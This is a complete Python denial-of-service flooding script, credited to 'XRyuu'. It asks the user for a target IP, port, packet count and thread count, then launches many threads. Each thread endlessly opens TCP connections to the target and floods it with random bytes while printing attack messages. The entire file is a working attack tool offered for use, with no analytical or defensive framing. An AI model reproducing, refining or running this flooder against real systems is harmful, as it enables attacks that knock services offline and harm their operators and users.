import random
import socket
import threading
import os
os.system("clear")

print("•------------------------------------•")
print("[+] Tools By XRyuu")
print("[+] Created By XRyuu ")
print("[+] Dont Leak This Ddos tools")
print("[!] Dont Rename Tools")
print("[#] Credit : XRyuu")
print("     || TCP || UDP || HTTPS ||         ")
print("•-------------------------------------•")

ip = str(input("[/] IP : "))
port = int(input("[/] PORT   : "))
times = int(input("[/] PACKET : "))
threads = int(input("[/] THREADS (1000) : "))

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]","[?]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" SEND DDOS!!!")
        except socket.error:
            s.close()
            print("[!] ATTACKING IP => ",ip," AND PORT : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()